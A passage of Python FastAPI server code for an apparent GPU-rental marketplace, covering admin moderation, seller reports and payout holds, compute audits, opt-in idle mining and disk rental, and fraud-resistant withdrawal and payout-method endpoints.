        "balance": round(u.balance, 2), "earnings": round(u.earnings, 2),
        "can_accept_paid_jobs": u.can_accept_paid_jobs,
        "is_admin": _is_admin(u),
    } for u in rows], "count": len(rows)}


@app.get("/admin/specs")
def admin_specs(me=Depends(require_admin), db: Session = Depends(get_db),
                limit: int = Query(100, le=500)):
    from db import User, SellerSpec
    rows = db.query(SellerSpec).order_by(SellerSpec.id.desc()).limit(limit).all()
    owners = {u.id: u.username for u in db.query(User).all()}
    return {"specs": [{
        "id": s.id, "owner": owners.get(s.user_id, "?"),
        "gpu_model": s.gpu_model, "price_per_hour": s.price_per_hour,
        "status": s.status, "attested": s.attested, "confidential": s.confidential,
        "region": s.region, "region_verified": s.region_verified,
        "jobs_completed": s.jobs_completed, "jobs_failed": s.jobs_failed,
        "fraud_count": s.fraud_count,
    } for s in rows], "count": len(rows)}


@app.get("/admin/payouts")
def admin_payouts(me=Depends(require_admin), db: Session = Depends(get_db),
                  status: str = "requested", limit: int = Query(100, le=500)):
    from db import User, Payout
    rows = db.query(Payout).filter(Payout.status == status).order_by(
        Payout.id.desc()).limit(limit).all()
    owners = {u.id: u.username for u in db.query(User).all()}
    return {"payouts": [{
        "id": p.id, "user": owners.get(p.user_id, "?"), "amount_usd": round(p.amount_usd, 2),
        "kind": p.kind, "status": p.status,
        "created_at": p.created_at.isoformat() if p.created_at else None,
    } for p in rows], "count": len(rows)}


class AdminRoleModel(BaseModel):
    role: str = Field(..., description="buyer|seller")

@app.post("/admin/users/{username}/role")
def admin_set_role(username: str, data: AdminRoleModel,
                   me=Depends(require_admin), db: Session = Depends(get_db)):
    """Moderation: flip a user between buyer and seller (reuses validated set_role)."""
    try:
        new_role = set_role(db, username, data.role)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"status": "ok", "username": username, "role": new_role}


@app.post("/admin/specs/{spec_id}/delist")
def admin_delist_spec(spec_id: int, me=Depends(require_admin), db: Session = Depends(get_db)):
    """Moderation: force a node offline (e.g. abuse). Reversible when it heartbeats."""
    from db import SellerSpec
    spec = db.query(SellerSpec).filter(SellerSpec.id == spec_id).first()
    if not spec:
        raise HTTPException(status_code=404, detail="Spec not found")
    spec.status = "offline"
    db.add(spec); db.commit()
    return {"status": "ok", "spec_id": spec_id, "new_status": "offline"}


# ------------------- REPORTS + PAYOUT HOLDS + BIWEEKLY PAYOUT RUN -------------------
# Seller earnings are held for PAYOUT_HOLD_DAYS (default 14) before they can be paid, so
# a dispute/report has a review window; matured earnings are then paid on the biweekly
# batch run. A report can place a seller's payouts on hold beyond the window until an
# admin clears it.

class ReportSellerModel(BaseModel):
    seller: str = Field(..., description="seller username or a GPU public_id")
    reason: str = Field(..., min_length=3, max_length=500)


def _resolve_seller(db, ident: str):
    u = get_user_by_username(db, ident)
    if u:
        return u
    from db import get_spec_by_public_id
    spec = get_spec_by_public_id(db, ident)
    return get_user_by_id(db, spec.user_id) if spec else None


@app.post("/report/seller", tags=["marketplace"])
def report_seller(data: ReportSellerModel, request: Request,
                  user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Report a seller (abuse, non-delivery, bad result). It's recorded, the founder
    inbox is notified, and — if PAYOUT_HOLD_ON_REPORT is on (default) — the seller's
    payouts are placed on hold pending review so nothing is disbursed while we check.
    The 14-day earnings hold already buys a review window; a report can extend it."""
    ip = _client_ip(request) or "?"
    if _rl_blocked(f"report:{ip}", 20, 3600):
        return {"ok": True, "message": "Thanks — your report was received."}
    seller = _resolve_seller(db, data.seller.strip())
    if not seller:
        raise HTTPException(status_code=404, detail="seller not found")
    reporter = get_user_by_username(db, _username(user))
    held = False
    if os.getenv("PAYOUT_HOLD_ON_REPORT", "true").lower() == "true":
        from db import place_payout_hold
        place_payout_hold(db, seller.id,
                          reason=f"reported by {reporter.username if reporter else '?'}")
        held = True
    audit(db, "seller.reported", actor=(reporter.username if reporter else None),
          resource_type="user", resource_id=seller.username, ip=ip,
          detail={"reason": data.reason[:200], "payout_held": held})
    try:
        _email_admins(db, f"Seller reported: {seller.username}",
                      f"{seller.username} was reported by "
                      f"{reporter.username if reporter else 'a user'}.\n"
                      f"Reason: {data.reason[:300]}\nPayouts held pending review: {held}.")
    except Exception:
        logger.exception("failed to notify admins of seller report")
    return {"ok": True, "payout_held": held,
            "message": "Thanks — your report was received and is under review."}


class PayoutHoldModel(BaseModel):
    reason: str = Field("under review", max_length=200)


@app.post("/admin/sellers/{username}/payout-hold", tags=["payments"])
def admin_payout_hold(username: str, data: PayoutHoldModel,
                      me=Depends(require_admin), db: Session = Depends(get_db)):
    """Hold a seller's payouts (their matured earnings stay pending, unbatched)."""
    seller = get_user_by_username(db, username)
    if not seller:
        raise HTTPException(status_code=404, detail="seller not found")
    from db import place_payout_hold
    place_payout_hold(db, seller.id, reason=data.reason)
    audit(db, "payout.hold", actor=me.username,
          resource_type="user", resource_id=username, detail={"reason": data.reason[:200]})
    return {"ok": True, "username": username, "payout_hold": True}


@app.post("/admin/sellers/{username}/payout-release", tags=["payments"])
def admin_payout_release(username: str, me=Depends(require_admin),
                         db: Session = Depends(get_db)):
    """Release a payout hold after review; matured earnings become batchable again."""
    seller = get_user_by_username(db, username)
    if not seller:
        raise HTTPException(status_code=404, detail="seller not found")
    from db import clear_payout_hold
    clear_payout_hold(db, seller.id)
    audit(db, "payout.release", actor=me.username,
          resource_type="user", resource_id=username)
    return {"ok": True, "username": username, "payout_hold": False}


@app.post("/admin/payouts/run", tags=["payments"])
def admin_run_payouts(me=Depends(require_admin), db: Session = Depends(get_db),
                      min_threshold_minor: int = 0, execute: bool = True):
    """Run the biweekly payout batch: for every seller with matured earnings (past the
    14-day hold and not under a report hold), aggregate ALL of them into ONE payout and
    send it. Idempotent — a re-run the same day never double-pays. Schedule this every
    two weeks (see docs/PAYOUT_HOLD_AND_SCHEDULE.md)."""
    import payout_routing as pr
    batches = pr.run_scheduled_payouts(db, min_threshold_minor=min_threshold_minor,
                                       execute=execute)
    return {"ok": True, "count": len(batches),
            "batches": [{"public_id": b.public_id, "seller_id": b.seller_id,
                         "total_minor": b.total_amount_minor, "state": b.state,
                         "rail": b.rail_type} for b in batches]}


@app.post("/admin/audits/run", tags=["seller"])
def admin_run_audits(me=Depends(require_admin), db: Session = Depends(get_db),
                     difficulty: str = "easy", sample_rate: float = Query(None, ge=0, le=1)):
    """Randomly spot-check live sellers with server-seeded known-answer challenges
    (proof of continuous honest compute). A seller who isn't really running work on the
    claimed GPU fails the challenge in /jobs/result — dropping reputation and, on a
    failed audit, freezing their payouts. Schedule this periodically (cron)."""
    import seller_audit
    dispatched = seller_audit.run_spot_checks(db, difficulty=difficulty, sample_rate=sample_rate)
    return {"ok": True, "dispatched": len(dispatched), "audits": dispatched}


@app.post("/admin/quorum/run", tags=["seller"])
def admin_run_quorum(me=Depends(require_admin), db: Session = Depends(get_db),
                     replicas: int = Query(3, ge=2, le=10), difficulty: str = "easy"):
    """Open a quorum check: dispatch the SAME deterministic challenge to several distinct
    live sellers and compare their results. A seller whose result diverges from the
    majority is frozen for fraud; a no-majority split holds all participants for review.
    Returns the check + the replica tasks each seller must run."""
    import quorum
    chk = quorum.run_quorum_audit(db, replicas=replicas, difficulty=difficulty)
    if chk is None:
        raise HTTPException(status_code=409,
                            detail="not enough distinct live sellers for a quorum (need >= 2)")
    import json as _json
    subs = _json.loads(chk.submissions or "{}")
    return {"ok": True, "quorum_id": chk.public_id, "status": chk.status,
            "min_agree": chk.min_agree,
            "replicas": [{"seller_id": int(sid), "task_id": r["task_id"]}
                         for sid, r in subs.items()]}


# ------------------- IDLE FALLBACK (earn when unrented) -------------------

@app.post("/nodes/idle_fallback")
def toggle_idle_fallback(data: IdleFallbackModel, user: dict = Depends(get_current_user),
                         db: Session = Depends(get_db)):
    """Opt a node in/out of earning a background trickle (NiceHash) when it has no
    paying job. Off by default. Paid work always preempts mining; the seller's
    NiceHash wallet stays on the node — Petabyte never holds mining funds."""
    owner = _require_seller(db, user)
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    set_idle_fallback(db, spec, data.enabled)
    return {"status": "ok", "spec_id": spec.id, "idle_fallback": spec.idle_fallback}


@app.post("/nodes/idle_report")
def idle_report(data: IdleReportModel, agent=Depends(api_key_user),
                db: Session = Depends(get_db)):
    """Agent reports idle-mining stats (for the seller's own visibility). Petabyte
    does not touch the earnings — they go straight to the seller's NiceHash wallet."""
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != agent.id:
        raise HTTPException(status_code=404, detail="Spec not found or not yours")
    record_idle_report(db, spec, data.algo, data.hashrate, data.est_daily_usd)
    # Mining hashrate is a memory-bandwidth proxy — compare it to the public per-GPU number for
    # the CLAIMED model (advisory; too noisy to freeze on). Surfaces a mismatch to the seller
    # and records a labelled data point for the authenticity model.
    verdict = None
    try:
        from gpu_benchmark import classify, HASHRATE_ALGO_METRIC
        metric = HASHRATE_ALGO_METRIC.get(str(data.algo or "").lower())
        if metric and spec.gpu_model and data.hashrate:
            v = classify(spec.gpu_model, data.hashrate, metric=metric)
            verdict = v["verdict"]
            _record_benchmark_sample(db, spec, source="idle_mining",
                                     metrics={metric: data.hashrate}, verdict=verdict)
    except Exception:
        logger.debug("idle hashrate authenticity check failed (non-fatal)", exc_info=True)
    return {"status": "ok", "hashrate_verdict": verdict}


@app.get("/nodes/{spec_id}/idle")
def idle_status(spec_id: int, user: dict = Depends(get_current_user),
                db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    spec = _get_spec(db, spec_id)
    if not spec or spec.user_id != me.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    return {"spec_id": spec.id, "idle_fallback": bool(spec.idle_fallback),
            "algo": spec.idle_algo, "hashrate": spec.idle_hashrate,
            "est_daily_usd": spec.idle_est_daily_usd,
            "reported_at": str(spec.idle_reported_at) if spec.idle_reported_at else None,
            "credited_total_usd": idle_credited_total(db, spec.id),
            "worker_id": f"pb-{spec.id}"}


# ------------------- Spare-disk rental (rent unused disk to a web3/BitTorrent network) -------------------
# A seller rents spare disk to a decentralized storage network (Storj / BTFS / Sia). This is NOT an
# idle/fallback mode — it is an EXPLICIT contribution the seller turns on with real arguments (a
# provider AND a GB cap, both required). It runs INDEPENDENTLY of GPU rentals (disk != GPU), so it
# earns whether or not a job is running. Each node contributes under a UNIQUE node name
# (pbdisk-<spec_id>) so a settled payout attributes 1:1 to the seller's unified balance — no
# per-seller storage wallet (the attribution model NiceHash's `pb-<spec_id>` worker id also uses).
# The seller sets the GB cap and can change it, pause, or delete at any time.

def _disk_cfg(spec) -> dict:
    """The config the agent needs to start/limit/stop its storage node (sent on the heartbeat)."""
    return {"enabled": bool(spec.disk_enabled),
            "provider": spec.disk_provider,
            "alloc_gb": spec.disk_alloc_gb,
            "node_name": disk_node_name(spec)}


@app.post("/nodes/disk", tags=["seller"])
def configure_disk_rental(data: DiskRentalModel, user: dict = Depends(get_current_user),
                          db: Session = Depends(get_db)):
    """Configure a node's SPARE-DISK rental to a storage network. Enabling ALWAYS requires explicit
    args — a `provider` AND an `alloc_gb` (GB cap); this is a configured contribution, never a
    defaulted fallback. Independent of GPU rentals (disk earns even while a paid job runs). Earnings
    land in the unified balance, attributed by the node name pbdisk-<id>; Petabyte never holds a
    per-seller storage wallet. Disable by sending enabled=false (config kept for one-click re-enable)."""
    owner = _require_seller(db, user)
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    if data.enabled:
        # EXPLICIT args required to enable — no defaulting of provider or cap.
        provider = (data.provider or "").lower()
        if provider not in DISK_PROVIDERS:
            raise HTTPException(status_code=422, detail={
                "code": "DISK_PROVIDER_REQUIRED",
                "message": f"enabling disk rental requires a provider ({sorted(DISK_PROVIDERS)})."})
        if data.alloc_gb is None or int(data.alloc_gb) < 1:
            raise HTTPException(status_code=422, detail={
                "code": "DISK_ALLOC_REQUIRED",
                "message": "enabling disk rental requires alloc_gb (the GB cap to pledge, >= 1)."})
        alloc = min(int(data.alloc_gb), MAX_DISK_ALLOC_GB)
        set_disk_rental(db, spec, True, provider=provider, alloc_gb=alloc)
    else:
        # Pause: keep the stored provider/cap so re-enabling is one click.
        set_disk_rental(db, spec, False)
    return {"status": "ok", "spec_id": spec.id, "disk": _disk_cfg(spec)}


@app.delete("/nodes/{spec_id}/disk", tags=["seller"])
def delete_disk_node(spec_id: int, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """Cancel + delete disk contribution: disable and clear the config. The agent removes the
    storage-node container and wipes its data dir on the next heartbeat. Already-credited earnings
    are unaffected (they're in the seller's balance)."""
    owner = _require_seller(db, user)
    spec = _get_spec(db, spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    delete_disk_rental(db, spec)
    return {"status": "deleted", "spec_id": spec.id, "disk": _disk_cfg(spec)}


@app.post("/nodes/disk_report", tags=["seller"])
def disk_report(data: DiskReportModel, agent=Depends(api_key_user),
                db: Session = Depends(get_db)):
    """Agent reports storage-node usage + an estimated daily trickle (for the seller's visibility).
    The actual earnings are settled separately from the provider by node name (disk_reconcile)."""
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != agent.id:
        raise HTTPException(status_code=404, detail="Spec not found or not yours")
    record_disk_report(db, spec, data.provider, data.used_gb, data.est_daily_usd)
    return {"status": "ok", "spec_id": spec.id, "node_name": disk_node_name(spec)}


def _node_reporter(x_api_key: str = Header(None, alias="X-API-KEY"),
                   authorization: str = Header(None), db: Session = Depends(get_db)):
    """Resolve the caller for a node self-report from EITHER an agent API key (the daemon) OR the
    owner's bearer token (a seller running `petabyte node sync-models`). Ownership is still checked
    per-spec at the call site, so this only widens WHO may report, never WHICH node."""
    if x_api_key:
        try:
            data = decode_api_key(x_api_key)
        except ValueError as e:
            raise HTTPException(status_code=401, detail=str(e))
        if is_jti_revoked(db, data["jti"]):
            raise HTTPException(status_code=401, detail="Key revoked")
        u = get_user_by_username(db, data["u"])
        if not u:
            raise HTTPException(status_code=401, detail="Unknown user")
        return u
    if authorization and authorization.lower().startswith("bearer "):
        try:
            claims = verify_token(authorization.split(" ", 1)[1])
        except ValueError:
            raise HTTPException(status_code=401, detail="Invalid or expired token")
        u = get_user_by_username(db, _username(claims))
        if not u:
            raise HTTPException(status_code=401, detail="Unknown user")
        return u
    raise HTTPException(status_code=401, detail="Authentication required (X-API-KEY or bearer token)")


@app.post("/nodes/models", tags=["seller"])
def report_cached_models(data: dict, actor=Depends(_node_reporter), db: Session = Depends(get_db)):
    """Report which model ids a node holds locally (from its ~/.petabyte cache). Feeds the
    scheduler's cache-locality signal so a job prefers a node that already has the model — avoiding a
    re-download of tens of GB. Body: {spec_id, models:[...]}. Callable by the agent (X-API-KEY) or
    the node's owner (bearer, e.g. `petabyte node sync-models`)."""
    spec = _get_spec(db, (data or {}).get("spec_id"))
    if not spec or spec.user_id != actor.id:
        raise HTTPException(status_code=404, detail="Spec not found or not yours")
    n = set_spec_cached_models(db, spec, (data or {}).get("models") or [])
    return {"status": "ok", "spec_id": spec.id, "cached_models": n}


@app.get("/nodes/{spec_id}/models", tags=["seller"])
def node_cached_models(spec_id: int, user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    spec = _get_spec(db, spec_id)
    if not spec or not me or spec.user_id != me.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    return {"spec_id": spec.id, "models": spec_cached_models(spec),
            "reported_at": str(spec.cached_models_at) if spec.cached_models_at else None}


@app.get("/nodes/{spec_id}/disk", tags=["seller"])
def disk_status(spec_id: int, user: dict = Depends(get_current_user),
                db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    spec = _get_spec(db, spec_id)
    if not spec or not me or spec.user_id != me.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    return {"spec_id": spec.id, "enabled": bool(spec.disk_enabled),
            "provider": spec.disk_provider, "alloc_gb": spec.disk_alloc_gb,
            "used_gb": spec.disk_used_gb, "est_daily_usd": spec.disk_est_daily_usd,
            "reported_at": str(spec.disk_reported_at) if spec.disk_reported_at else None,
            "credited_total_usd": disk_credited_total(db, spec.id),
            "node_name": disk_node_name(spec)}


@app.get("/disk/providers", tags=["seller"])
def disk_providers():
    """The storage-network adapters a node can pledge disk to, with an honest net $/TB/month
    reference for the pre-commit estimate. Actual earnings come from the provider (disk_reconcile);
    this is a planning figure, not a payout guarantee."""
    ref = DISK_REFERENCE_USD_PER_TB_MONTH
    return {"providers": [
        {"id": "storj", "name": "Storj", "kind": "web3 object storage",
         "image": "storjlabs/storagenode:latest", "est_usd_per_tb_month": ref},
        {"id": "btfs", "name": "BitTorrent File System (BTFS)", "kind": "bittorrent / TRON",
         "image": "btfs/node:latest", "est_usd_per_tb_month": ref},
        {"id": "sia", "name": "Sia (hostd)", "kind": "web3 storage host",
         "image": "ghcr.io/siafoundation/hostd:latest", "est_usd_per_tb_month": ref},
    ], "take_rate": STORAGE_TAKE_RATE,
       "note": "Each node contributes under a unique name (pbdisk-<id>); earnings land in your "
               "unified Petabyte balance. Opt-in; you set the GB cap and can disable/delete anytime."}


# ------------------- ACCOUNT / NOTIFICATIONS -------------------

@app.post("/account/email")
def set_email(data: EmailModel, user: dict = Depends(get_current_user),
              db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    new_email = (data.email or "").strip()
    # Changing the address ALWAYS drops verified status. An email becomes a trusted identity
    # (payout eligibility, the admin allowlist) only after the /email/verify token flow, which
    # requires control of the inbox. Without this reset, a user who verified their own address
    # could switch to a privileged one and carry a stale email_verified=True — the root of the
    # /account/email -> admin escalation. Setting an email here never grants trust by itself.
    if new_email.lower() != (me.email or "").lower():
        me.email_verified = False
        me.email_token = None
        me.email_token_exp = None
    me.email = new_email
    me.notify_email = data.notify_email
    db.add(me); db.commit()
    return {"status": "ok", "email": me.email, "notify_email": me.notify_email,
            "email_verified": bool(me.email_verified)}


@app.get("/notifications")
def get_notifications(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    return {"notifications": [{"event_type": n.event_type, "subject": n.subject,
                               "status": n.status, "created_at": str(n.created_at)}
                              for n in list_notifications(db, me.id)]}


# ------------------- PAYOUTS (withdraw earnings) -------------------

@app.post("/wallet/methods", tags=["wallet"])
def add_method(data: PayoutMethodModel, request: Request,
               user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Add a payout destination.

    This is THE fraud vector in a marketplace: take over an account, swap the bank
    details, drain the earnings. So we make it expensive:
      * the current password must be re-entered (a stolen session is not enough)
      * the account's email must be verified (so the real owner gets told)
      * the destination is quarantined for a cooling-off period before it can be paid
      * the change is written to the audit log, and the owner is notified
    """
    me = get_user_by_username(db, _username(user))

    # step-up: prove you know the password, not just that you hold a token
    if not data.password or not verify_password(data.password, me.password):
        audit(db, "payout_method.add_denied", actor=me, ip=_client_ip(request),
              request_id=getattr(request.state, "request_id", None),
              detail={"reason": "bad password re-auth"})
        raise HTTPException(status_code=403, detail={
            "code": "REAUTH_REQUIRED",
            "message": "Confirm your password to change payout details."})

    if not me.email_verified:
        raise HTTPException(status_code=403, detail={
            "code": "EMAIL_NOT_VERIFIED",
            "message": "Verify your email before adding a payout destination — it is how "
                       "we tell you if someone changes it."})
    try:
        m = add_payout_method(db, me, data.kind, data.destination, data.label)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    audit(db, "payout_method.added", actor=me, resource_type="payout_method",
          resource_id=m.id, ip=_client_ip(request),
          request_id=getattr(request.state, "request_id", None),
          detail={"kind": m.kind, "destination": redact_destination(m.destination)})
    try:   # tell the owner OUT OF BAND — a thief holding a session token can't unsend this
        notifications.notify(db, me.id, "payout_method.added", kind=m.kind,
                             dest=redact_destination(m.destination)[-4:],
                             hours=PAYOUT_COOLING_OFF_H)
    except Exception:
        logger.exception("failed to notify payout method change")

    return {"status": "ok", "method_id": m.id, "kind": m.kind, "verified": m.verified,
            "destination": redact_destination(m.destination),
            "payable_after_hours": PAYOUT_COOLING_OFF_H}


@app.post("/wallet/methods/{method_id}/verify")
def verify_method(method_id: int, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """Verify ownership + run KYC/sanctions screening before the method can be paid.
    (Stub screen in sandbox; wire Persona/Sumsub + Chainalysis/TRM in production.)"""
    me = get_user_by_username(db, _username(user))
    m = get_payout_method(db, method_id, me.id)
    if not m:
        raise HTTPException(status_code=404, detail="Method not found")
    if not screen(m.kind, m.destination):
        raise HTTPException(status_code=403, detail="Destination failed screening")
    m.verified = True; db.add(m); db.commit()
    return {"status": "ok", "method_id": m.id, "verified": True}


@app.get("/wallet/methods")
def get_methods(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    # NEVER return the full destination — not even to its owner. If the account is
    # compromised, the bank details should not be readable from the API.
    return {"methods": [{"id": m.id, "kind": m.kind,
                         "destination": redact_destination(m.destination),
                         "label": m.label, "verified": m.verified,
                         "payable": payout_method_is_cooled_off(m)}
                        for m in list_payout_methods(db, me.id)]}


@app.post("/wallet/withdraw", tags=["wallet"])
def withdraw(data: WithdrawModel, request: Request,
             user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Withdraw earnings. Money leaving the system is the highest-risk action here, so
    it is gated on: a verified email, a screened destination, and a cooling-off period
    that means a freshly-added (i.e. possibly attacker-added) destination cannot be
    drained immediately."""
    me = get_user_by_username(db, _username(user))
    if not me.email_verified:
        raise HTTPException(status_code=403, detail={
            "code": "EMAIL_NOT_VERIFIED",
            "message": "Verify your email before withdrawing."})
    m = get_payout_method(db, data.method_id, me.id)
    if not m:
        raise HTTPException(status_code=404, detail="Method not found")
    if not m.verified:
        raise HTTPException(status_code=403, detail="Method not verified")

    # COOLING-OFF: a destination added minutes ago cannot receive money yet. This is
    # what turns an account takeover from "instant drain" into "you get an email and
    # 24 hours to stop it".
    if not payout_method_is_cooled_off(m):
        audit(db, "payout.blocked_cooling_off", actor=me,
              resource_type="payout_method", resource_id=m.id, ip=_client_ip(request),
              request_id=getattr(request.state, "request_id", None))
        raise HTTPException(status_code=403, detail={
            "code": "PAYOUT_METHOD_COOLING_OFF",
            "message": f"This destination was added recently and cannot receive funds "
                       f"for {PAYOUT_COOLING_OFF_H}h after being added."})

    # ANTI-FRAUD HOLD: earnings from a just-completed job clear a dispute/re-verification window
    # before they can leave. Only pay out what has cleared.
    _wd = float(withdrawable_earnings(db, me))
    if data.amount > _wd + 1e-9:
        raise HTTPException(status_code=402, detail={
            "code": "EARNINGS_CLEARING",
            "message": f"${_wd:.2f} is available to withdraw now. The rest is in a "
                       f"{EARNINGS_HOLD_HOURS}h clearing/dispute window after each job completes.",
            "withdrawable_usd": round(_wd, 2)})
    # INSTANT (fast) cash-out is locked until the seller has matured — the fast-exit fraud window.
    if data.instant and not is_payout_matured(db, me):
        raise HTTPException(status_code=403, detail={
            "code": "INSTANT_PAYOUT_LOCKED",
            "message": f"Instant payout unlocks after {PAYOUT_MATURITY_MIN_JOBS} completed jobs in "
                       f"good standing. Use the free scheduled payout, or withdraw once earnings clear."})
    from db import instant_payout_fee
    fee = float(instant_payout_fee(data.amount)) if data.instant else 0.0
    if data.instant and fee >= data.amount:
        raise HTTPException(status_code=422, detail={
            "code": "AMOUNT_TOO_SMALL_FOR_INSTANT",
            "message": "That amount is too small for an instant payout after the fee — "
                       "withdraw more, or use the free scheduled payout."})
    p = request_payout(db, me, m, data.amount, fee=fee)
    if not p:
        raise HTTPException(status_code=402, detail="Insufficient earnings")
    audit(db, "payout.requested", actor=me, resource_type="payout", resource_id=p.id,
          ip=_client_ip(request),
          request_id=getattr(request.state, "request_id", None),
          detail={"amount_usd": str(p.amount_usd), "fee_usd": str(p.fee_usd or 0),
                  "instant": bool(data.instant), "kind": p.kind,
                  "destination": redact_destination(m.destination)})
    notifications.notify(db, me.id, "payout.requested", amount=p.amount_usd, kind=p.kind)
    return {"status": "ok", "payout_id": p.id, "amount_usd": p.amount_usd,
            "fee_usd": float(p.fee_usd or 0), "instant": bool(data.instant),
            "payout_status": p.status, "kind": p.kind}


@app.get("/wallet/payout_quote", tags=["wallet"])
def payout_quote(amount: float = Query(..., gt=0),
                 user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Show the cost BEFORE committing: scheduled payouts are free; instant costs a small fee.
    Lets the UI present both options honestly so nobody is surprised by a deduction."""
    from db import instant_payout_fee
    me = get_user_by_username(db, _username(user))
    fee = float(instant_payout_fee(amount))
    wd = float(withdrawable_earnings(db, me))
    matured = is_payout_matured(db, me)
    return {
        "amount_usd": round(amount, 2),
        "withdrawable_now_usd": round(wd, 2),
        "clearing_usd": round(max(0.0, float(me.earnings) - wd), 2),
        "hold_hours": EARNINGS_HOLD_HOURS,
        "scheduled": {"fee_usd": 0.0, "net_usd": round(amount, 2),
                      "note": "Free — paid out on your schedule / next batch."},
        "instant": {"fee_usd": round(fee, 2), "net_usd": round(amount - fee, 2),
                    "available": fee < amount and matured,
                    "eligible": matured,
                    "note": ("Paid out right away for a small fee." if matured else
                             f"Unlocks after {PAYOUT_MATURITY_MIN_JOBS} completed jobs in good standing.")},
    }


# ------------------- EMAIL VERIFICATION -------------------

class EmailModel(BaseModel):
    email: str = Field(max_length=254)


class EmailConfirmModel(BaseModel):
    token: str = Field(max_length=256)


@app.get("/referral", tags=["account"])
def my_referral(request: Request, me=Depends(get_current_user), db: Session = Depends(get_db)):
    """This user's share code, link, and earnings so far."""
    user = get_user_by_username(db, _username(me))
    if not user:
        raise HTTPException(status_code=404, detail="user not found")
    code = ensure_referral_code(db, user)
    base = os.getenv("PUBLIC_BASE_URL", "").rstrip("/") or str(request.base_url).rstrip("/")
    # how many people used this code, how many qualified, credit earned
    from db import User as _U, LedgerTx as _L
    invited = db.query(_U).filter(_U.referred_by == user.id).count()
    qualified = db.query(_U).filter(_U.referred_by == user.id,
                                    _U.referral_rewarded == True).count()  # noqa: E712
    earned = db.query(_L).filter(_L.reference_type == "referral_credit",
                                 _L.reference_id == str(user.id)).count() * float(_referral_amount())
    return {
        "code": code,
        "link": f"{base}/?ref={code}",
        "reward_usd": float(_referral_amount()),
        "invited": invited,
        "qualified": qualified,
        "credit_earned_usd": round(earned, 2),
        "pending": max(0, invited - qualified),
    }


def _hash_email(email: str) -> str:
    """A short, non-reversible correlation tag for logs — never the raw address, and NOT a
    plain digest a log reader could re-identify by hashing candidate addresses. Keyed with
    HMAC-SHA-256 under the server SECRET_KEY, then truncated for correlation only."""
    import hashlib
    import hmac
    # Require a real secret: a fixed public fallback ("petabyte") would make these tags
    # enumerable again (hash candidate addresses under the known key). SECRET_KEY is required
    # config anyway — it also signs JWTs — so a running server always has it.
    key = os.getenv("SECRET_KEY", "")
    if not key:
        raise RuntimeError("SECRET_KEY is required to compute email correlation tags")
    return hmac.new(key.encode("utf-8"), email.encode("utf-8"), hashlib.sha256).hexdigest()[:12]


def _newsletter_add_to_mailgun(email: str) -> str:
    """Add an address to the Mailgun mailing list (NEWSLETTER_LIST_ADDRESS). BEST-EFFORT:
    returns a status string and NEVER raises or leaks provider internals (keys, headers,
    bodies, stack traces). Honors MAILGUN_API_BASE so US/EU regions both work.

    Returns one of:
      synced        added / upserted to the list
      already       already a member (idempotent success)
      unconfigured  MAILGUN_API_KEY or NEWSLETTER_LIST_ADDRESS not set
      failed        Mailgun 4xx/5xx, timeout, DNS/network error, or malformed response
    """
    api_key = os.getenv("MAILGUN_API_KEY", "").strip()
    if not (api_key and NEWSLETTER_LIST_ADDRESS):
        return "unconfigured"
    from email_service import MAILGUN_API_BASE
    url = f"{MAILGUN_API_BASE}/v3/lists/{NEWSLETTER_LIST_ADDRESS}/members"
    import httpx
    try:
        r = httpx.post(url, auth=("api", api_key), timeout=10,
                       data={"address": email, "subscribed": "yes", "upsert": "yes"})
    except Exception as e:  # noqa: BLE001 — timeout, DNS, connect, protocol; never leak detail
        logger.warning("mailgun newsletter add: transport error (%s)", type(e).__name__)
        return "failed"
    if r.status_code in (200, 201):
        return "synced"
    if r.status_code == 400 and "already exists" in (r.text or "").lower():
        return "already"
    # Log the STATUS only — never the provider body, headers, or the API key.
    logger.warning("mailgun newsletter add failed: HTTP %s", r.status_code)
    return "failed"


def _newsletter_subscribe_mailchimp(email: str):
    """Legacy Mailchimp audience path (NEWSLETTER_PROVIDER=mailchimp)."""
    if not (MAILCHIMP_API_KEY and MAILCHIMP_AUDIENCE_ID):
        raise HTTPException(status_code=503, detail={
            "code": "NEWSLETTER_UNCONFIGURED",
            "message": "The newsletter isn't wired up yet. Email info@petabyte.market to "
                       "be added."})
    if "-" not in MAILCHIMP_API_KEY:
        raise HTTPException(status_code=500, detail={"code": "NEWSLETTER_MISCONFIGURED",
            "message": "Mailchimp API key is malformed (no datacenter suffix)."})
    dc = MAILCHIMP_API_KEY.rsplit("-", 1)[-1]     # e.g. us21
    url = (f"https://{dc}.api.mailchimp.com/3.0/lists/"
           f"{MAILCHIMP_AUDIENCE_ID}/members")
    import httpx
    r = httpx.post(url, auth=("anystring", MAILCHIMP_API_KEY), timeout=10,
                   json={"email_address": email, "status": "subscribed"})
    if r.status_code in (200, 201):
        return {"ok": True, "message": "You're subscribed. Thanks!"}
    if r.status_code == 400 and "Member Exists" in r.text:
        return {"ok": True, "message": "You're already on the list."}
    logger.warning("mailchimp subscribe failed: %s %s", r.status_code, r.text[:200])
    raise HTTPException(status_code=502, detail={"code": "NEWSLETTER_FAILED",
        "message": "Couldn't subscribe you just now. Please try again later."})


